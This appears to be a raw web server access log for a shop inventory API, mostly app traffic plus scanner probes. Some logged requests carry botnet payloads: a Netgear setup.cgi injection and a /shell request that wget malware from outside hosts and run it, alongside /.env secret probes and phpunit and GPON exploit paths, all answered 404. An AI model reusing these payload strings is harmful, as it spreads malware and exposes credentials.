::ffff:127.0.0.1 - - [31/Aug/2022:10:07:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:34 +0000] "GET /api/v1/users/62f2665099e2a94b91d436bb HTTP/1.0" 200 311 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:41 +0000] "GET /api/v1/templates?createUser=62f2665099e2a94b91d436bb HTTP/1.0" 200 109 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:43 +0000] "GET /api/v1/templates?createUser=62f2665099e2a94b91d436bb HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:55 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:26 +0000] "POST /api/v1/goods HTTP/1.0" 200 377 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 578 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:27 +0000] "PUT /api/v1/goods/630f3356f66eb6d6a8720858/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 600 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:39 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:45 +0000] "GET /api/v1/templates?createUser=62f2665099e2a94b91d436bb HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:47 +0000] "GET /api/v1/templates?createUser=62f2665099e2a94b91d436bb HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:52 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:52 +0000] "GET /api/v1/goods/user?limit=100&select=quantity%20price%20photo%20name HTTP/1.0" 200 424 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:09:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:09:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:13 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:13 +0000] "GET /api/v1/templates?createUser=62f2665099e2a94b91d436bb HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:10:13 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:10:14 +0000] "GET /api/v1/templates?createUser=62f2665099e2a94b91d436bb HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:18 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:10:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:10:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:10:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:10:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:48 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:10:48 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:49 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:10:49 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:10:49 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:13:23 +0000] "POST /api/v1/goods HTTP/1.0" 200 361 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:13:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:13:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1064 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:13:24 +0000] "PUT /api/v1/goods/630f3443f66eb6d6a87208ce/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:13:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:13:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1086 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:13:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1086 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:13:37 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:13:37 +0000] "GET /api/v1/goods/630f3443f66eb6d6a87208ce HTTP/1.0" 200 464 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:13:37 +0000] "GET /api/v1/transactions/user?good=630f3443f66eb6d6a87208ce&sort=-createdAt HTTP/1.0" 200 119 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:13:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:13:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:14:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:14:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:14:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:14:04 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:14:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:14:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:15:47 +0000] "POST /api/v1/goods HTTP/1.0" 200 357 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:15:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:15:48 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1543 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:15:48 +0000] "PUT /api/v1/goods/630f34d3f66eb6d6a87208f9/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:16:14 +0000] "GET /api/v1/goods/user?barCode=8656900056184 HTTP/1.0" 200 133 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:16:52 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:16:52 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:16:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1565 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:17:30 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:10:38:54 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://60.21.103.249:45255/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::1 - - [31/Aug/2022:10:41:37 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:10:41:37 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:10:54:50 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.0" 404 158 "-" "Hello, World"
::ffff:127.0.0.1 - - [31/Aug/2022:11:06:55 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:11:06:56 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:11:42:51 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::1 - - [31/Aug/2022:11:52:02 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:11:52:03 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:12:57:19 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:12:57:20 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:13:13:23 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:13:13:24 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:13:38:53 +0000] "HEAD / HTTP/1.0" 404 140 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
::ffff:127.0.0.1 - - [31/Aug/2022:13:52:33 +0000] "GET /c/ HTTP/1.0" 404 141 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::1 - - [31/Aug/2022:14:05:45 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:14:05:46 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:14:18:02 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:14:18:03 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:14:20:57 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:127.0.0.1 - - [31/Aug/2022:14:28:08 +0000] "GET / HTTP/1.0" 404 139 "-" "Go-http-client/1.1"
::ffff:127.0.0.1 - - [31/Aug/2022:14:37:09 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+synns.cf/jaws;sh+/tmp/jaws HTTP/1.0" 404 144 "-" "Hello, world"
::1 - - [31/Aug/2022:14:44:37 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:14:48:10 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [31/Aug/2022:14:48:10 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:127.0.0.1 - - [31/Aug/2022:14:58:01 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [31/Aug/2022:15:37:21 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:15:37:22 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
::1 - - [31/Aug/2022:15:37:23 +0000] "GET /users/sign_in HTTP/1.0" 404 152 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:16:05:24 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [31/Aug/2022:16:05:26 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:16:05:27 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:16:08:17 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:127.0.0.1 - - [31/Aug/2022:16:08:19 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::1 - - [31/Aug/2022:16:08:44 +0000] "GET /robots.txt HTTP/1.0" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:127.0.0.1 - - [31/Aug/2022:16:25:34 +0000] "HEAD / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::1 - - [31/Aug/2022:16:25:34 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:127.0.0.1 - - [31/Aug/2022:16:25:35 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::1 - - [31/Aug/2022:16:55:09 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:16:55:09 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:17:03:12 +0000] "GET / HTTP/1.0" 404 139 "-" "curl/7.29.0"
::ffff:127.0.0.1 - - [31/Aug/2022:17:06:05 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:17:06:05 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:17:27:06 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:17:27:06 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:17:40:39 +0000] "HEAD / HTTP/1.0" 404 140 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
::1 - - [31/Aug/2022:17:45:41 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:17:56:33 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [31/Aug/2022:18:05:58 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:18:06:00 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:18:26:17 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:19:27:33 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:19:27:34 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:19:30:04 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Linux; Android 8.0.0; FLA-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36"
::1 - - [31/Aug/2022:19:42:55 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [31/Aug/2022:20:05:27 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:20:05:27 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:20:10:43 +0000] "GET / HTTP/1.0" 404 139 "-" "Insomania/1.0"
::ffff:127.0.0.1 - - [31/Aug/2022:20:14:30 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [31/Aug/2022:20:41:42 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:20:41:42 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:20:53:34 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:20:55:18 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::1 - - [31/Aug/2022:20:58:43 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:21:21:00 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:21:21:01 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
